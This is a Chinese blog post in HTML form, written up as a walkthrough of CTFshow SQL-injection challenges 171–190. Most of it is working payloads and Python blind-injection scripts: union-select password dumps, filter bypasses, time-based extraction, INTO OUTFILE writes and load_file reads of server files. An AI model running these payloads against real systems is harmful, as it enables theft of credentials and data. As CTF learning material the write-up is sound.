@@ -1,0 +1,502 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta name="description" content="171 入门开始，直接union select 123database:ctfshow_webtable:ctfshow_user0&amp;#x27; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+  172 123database:ctfshow_webtable:ctfshow_user20&amp;#x27">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshowSQL注入">
+<meta property="og:url" content="http://jlan.darkflow.top/2022/04/07/CTFshowSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Jlan&#39;s Little World">
+<meta property="og:description" content="171 入门开始，直接union select 123database:ctfshow_webtable:ctfshow_user0&amp;#x27; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+  172 123database:ctfshow_webtable:ctfshow_user20&amp;#x27">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-07T06:06:06.000Z">
+<meta property="article:modified_time" content="2022-04-09T15:53:54.767Z">
+<meta property="article:author" content="Jlan">
+<meta name="twitter:card" content="summary"><title>CTFshowSQL注入 | Jlan's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/2022/04/07/CTFshowSQL%E6%B3%A8%E5%85%A5/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":false},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Jlan's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CTFshowSQL注入</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-09</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/2022/04/07/CTFshowSQL%E6%B3%A8%E5%85%A5/" data-flag-title="CTFshowSQL注入"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p><strong>171</strong></p>
+<p>入门开始，直接union select</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database:ctfshow_web</span><br><span class="line">table:ctfshow_user</span><br><span class="line">0&#x27; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>172</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database:ctfshow_web</span><br><span class="line">table:ctfshow_user2</span><br><span class="line">0&#x27; union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>173</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database:ctfshow_web</span><br><span class="line">table:ctfshow_user3</span><br><span class="line">0&#x27; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>174</strong></p>
+<p>返回内容中不能有数字了，试试布尔注入吧</p>
+<p>select * from tableName limit i,n</p>
+<p>i为索引，n为数量</p>
+<p>随便写的垃圾脚本</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1&#x27;and 1=     &amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>,<span class="number">57</span>):</span><br><span class="line">        sql = <span class="string">f&quot;if(ascii(substr((select password from ctfshow_user4 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,1,0)&quot;</span></span><br><span class="line">        url=<span class="string">f&quot;http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1&#x27;and 1=<span class="subst">&#123;sql&#125;</span>--+&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        tex=requests.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> tex:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">125</span>):</span><br><span class="line">        sql = <span class="string">f&quot;if(ascii(substr((select password from ctfshow_user4 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,1,0)&quot;</span></span><br><span class="line">        url=<span class="string">f&quot;http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1&#x27;and 1=<span class="subst">&#123;sql&#125;</span>--+&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        tex=requests.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> tex:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>175</strong></p>
+<p>啥都没了时间盲注</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>, <span class="number">57</span>):</span><br><span class="line">        sql = <span class="string">f&quot;if(ascii(substr((select password from ctfshow_user5 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(2),0)&quot;</span></span><br><span class="line">        url = <span class="string">f&quot;http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&#x27;and 1=<span class="subst">&#123;sql&#125;</span>--+&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">125</span>):</span><br><span class="line">        sql = <span class="string">f&quot;if(ascii(substr((select password from ctfshow_user5 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(2),0)&quot;</span></span><br><span class="line">        url=<span class="string">f&quot;http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&#x27;and 1=<span class="subst">&#123;sql&#125;</span>--+&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>或者试试文件读写</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27; --+</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>176</strong></p>
+<p>过滤了union select，大小写绕过或万能密码<code>1&#39; or 1=1--+</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database:ctfshow_web</span><br><span class="line">table:ctfshow_user</span><br><span class="line">0&#x27; unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>177</strong></p>
+<p>过滤了空格，/**/即可，不能用+，url会被转成空格</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>178</strong></p>
+<p>过滤了空格和*，制表符%09绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>179</strong></p>
+<p>%09也没了，还剩%0c</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>180</strong></p>
+<p>真没招了，看看wp，通过反引号分割，绝</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;union%0cselect&#x27;1&#x27;,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></div></figure>
+
+<p>还有</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>181</strong></p>
+<p>select不见了，万能密码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;%0cor%0cid=&#x27;26</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>182</strong></p>
+<p>flag不见了，其实不影响上面的，但是还是可以尝试模糊匹配</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;%0cor%0cusername%0clike%0c&#x27;%fla%</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>183</strong></p>
+<p>使用正则表达式和布尔盲注</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE email REGEXP &#x27;a&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p>意思是在email中匹配a的</p>
+<p>写脚本咯</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(substr(pass,<span class="subst">&#123;i&#125;</span>,1))regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        tex = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> tex:</span><br><span class="line">        	<span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>184</strong></p>
+<p>RIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中没有匹配的行。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name1</span><br><span class="line">RIGHT JOIN table_name2</span><br></pre></td></tr></table></div></figure>
+
+<p>我们将匹配后的表作为右表，使用正则查询即可</p>
+<p><code>ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;i&#125;,1)regexp(char(&#123;ord(j)&#125;)))</code></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        tex = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> tex:</span><br><span class="line">            <span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>记得问on是啥意思</p>
+<p><strong>185</strong></p>
+<p>过滤了数字，用true=1相加构造数字咧</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lo</span>(<span class="params">x</span>):</span></span><br><span class="line">    tmp=<span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,x):</span><br><span class="line">        tmp=tmp+<span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,(<span class="subst">&#123;lo(i)&#125;</span>),(true))regexp(char(<span class="subst">&#123;lo(<span class="built_in">ord</span>(j))&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        tex = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> tex:</span><br><span class="line">            <span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>186</strong></p>
+<p>同上，开打就完了</p>
+<p><strong>187</strong></p>
+<p>针对<code>md5(xxx,true)</code>的绕过：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450" >链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>只能寻找md5</p>
+<p>所以密码输入:ffifdyop即可</p>
+<p>进行运算得出的结果为</p>
+<p>‘or’6�]��!r,��b</p>
+<p>由于or后面6为真，所以语句恒为真</p>
+<p><strong>188</strong></p>
+<p>SQL比较真真离谱</p>
+<p>字符串当作数字处理</p>
+<p>即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如123bac会当作123处理。  因此我们在查询的时候即使username=0，也会返回一些以0开头的数据。</p>
+<p>00即可</p>
+<p><strong>189</strong></p>
+<p>空格消失法，提示flag在api/flag.php中，必然要读取文件咯</p>
+<p>尝试用户名发现只有两种回显结果，一种是查询失败，一种是密码错误</p>
+<p>布尔盲注走起</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">		tmp=flag+j</span><br><span class="line">		data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;if(load_file(&quot;/var/www/html/api/index.php&quot;)regexp(\&#x27;<span class="subst">&#123;tmp&#125;</span>\&#x27;),0,1)#&#x27;</span>,<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,&#125;</span><br><span class="line">		tex = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> tex.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">			<span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			flag=flag+j</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>190</strong></p>
+<p>进行一个布尔的盲注</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">		tmp=flag+j</span><br><span class="line">		data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and ((substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)#&quot;</span>,<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,&#125;</span><br><span class="line">		tex = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> tex.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">			<span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			flag=flag+j</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://jlan.darkflow.top">Jlan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://jlan.darkflow.top/2022/04/07/CTFshowSQL%E6%B3%A8%E5%85%A5/">http://jlan.darkflow.top/2022/04/07/CTFshowSQL%E6%B3%A8%E5%85%A5/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2022/04/06/CTFshowXSS/"><span class="paginator-prev__text">CTFshowXSS</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p 